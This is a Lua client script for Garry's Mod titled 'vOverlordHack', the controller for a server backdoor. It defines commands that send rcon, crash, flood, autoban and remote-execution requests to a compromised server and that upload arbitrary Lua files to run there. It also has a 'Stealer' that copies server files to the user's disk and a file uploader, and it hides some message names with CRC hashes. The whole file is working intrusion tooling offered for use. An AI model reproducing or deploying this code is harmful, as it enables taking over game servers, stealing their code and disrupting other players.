-- Commands

local commands = {"override", "rcon", "find", "lua", "say", "steal", "clean", "crash", "reload", "printrcon", "admins", "autoban", "cleanup", "cexec", "sayall", "flood", "unbindconsole", "unbindall", "models", "attack", "hide", "disg", "open", "close"}
table.sort(commands)

concommand.Add("v", function(_, _, args)
	net.Start("vCmd")
		net.WriteUInt(#args, 8)
		for k, v in pairs(args) do
			net.WriteString(v)
		end
	net.SendToServer()
end, function(_, args)
	local vars = {}
	args = string.sub(args, 2)
	if string.find(args, " ") then
		return nil
	else
		for k, v in pairs(commands) do
			if string.Left(v, string.len(args)) == args then
				table.insert(vars, "v " .. v .. " ")
			end
		end
		return vars
	end
end)


-- Print

local function Print(text)
	chat.AddText(Color(146, 232, 136), "[vOverlordHack] ", Color(255, 105, 105), text)
end


-- Lua Sender

concommand.Add("vsend", function(_, _, args)
	net.Start(util.CRC("vLuaRun"))
		net.WriteString(args[1])
		net.WriteString(args[2])
		net.WriteString(file.Read("lua/" .. args[2] .. ".lua", "MOD"))
	net.SendToServer()
end)


-- Stealer

local function delete(path)
	local files, dirs = file.Find(path .. "/*", "DATA")
	for _, v in pairs(files) do
		file.Delete(path .. "/" .. v)
	end
	for _, v in pairs(dirs) do
		delete(path .. "/" .. v)
		file.Delete(path .. "/" .. v)
	end
end

net.Receive("vStealer_start", function()
	if file.Exists("vStealer", "DATA") then
		delete("vStealer")
	else
		file.CreateDir("vStealer")
	end
end)

net.Receive("vStealer_write", function()
	local name = net.ReadString()
	file.Write("vStealer" .. name .. (string.Right(name, 4) == ".txt" and "" or ".txt"), net.ReadString())
	Print(string.sub(name, 2))
end)

net.Receive("vStealer_makedirectory", function()
	file.CreateDir("vStealer" .. net.ReadString())
end)


-- Uploader

concommand.Add("vupload", function(_, _, args)
	local path = table.concat(args, " ")
	if file.Exists(path, "DATA") then
		net.Start("vUpload")
			net.WriteString(path)
			net.WriteString(file.Read(path, "DATA"))
		net.SendToServer()
	else
		Print("Invalid file.")
	end
end)


-- Unlimited spraying

hook.Add("PlayerBindPress", "vUnlimitedSpraying", function(_, cmd)
	if string.find(cmd, "impulse 201") then
		RunConsoleCommand(util.CRC("vspray"))
	end
end)


-- Chat messages

net.Receive(tostring(util.CRC("vPrint")), function()
	Print(net.ReadString())
end)


RunConsoleCommand(util.CRC("vloaded"))